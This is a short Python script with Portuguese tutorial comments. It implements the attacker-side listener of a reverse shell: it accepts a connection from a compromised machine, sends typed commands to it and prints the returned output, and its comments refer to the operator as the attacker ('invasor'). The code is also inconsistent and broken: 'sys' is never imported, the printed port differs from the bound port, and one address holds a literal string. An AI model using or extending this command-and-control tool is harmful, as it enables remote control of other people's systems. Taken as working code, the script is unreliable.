import socket
import threading
import os

# 1 Codificamos o comando e o enviamos pela conexão ( conn.send ).
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            server.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            cliente_response = str(conn.recv(1024), 'utf-8')
            print(cliente_response, end="")

# 2 estamos configurando bind_ip e porta para o invasor inserir normalmente seu próprio IP,
# a porta é configurada para 90 (pode ser alterada)
bind_ip = "127.0.0.1"
bind_port = 90

#estamos criando um objeto socket, eu usei TCP (socket.AF_INET, socket.SOCK_STREAM)
#então o estamos ligando ao endereço do servidor, nós ouvimos qualquer conexão com um atraso de 5 segundos.

serv_add = ('bind_ip', 88)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind ((bind_ip, 88))

server.listen(2)

print('Ouvindo em {}: {}'.format(bind_ip, bind_port))

#após uma conexão bem-sucedida, aceitamos a conexão usando server.accept (), que retorna o IP do cliente ( addr [0] ),
# a porta ( addr [1] ) e um novo soquete conectado ( conn ). Imprimimos os detalhes e pedimos que os comandos sejam executados.

conn, addr = server.accept()

print('Conexão foi aceita de {} e porta {}'. format(addr[0], addr[1]))

print('Digite os comandos abaixo')

#chamamos a função e fechamos aconexão se a instrução IF quebrar.

send_commands(conn)

conn.close()

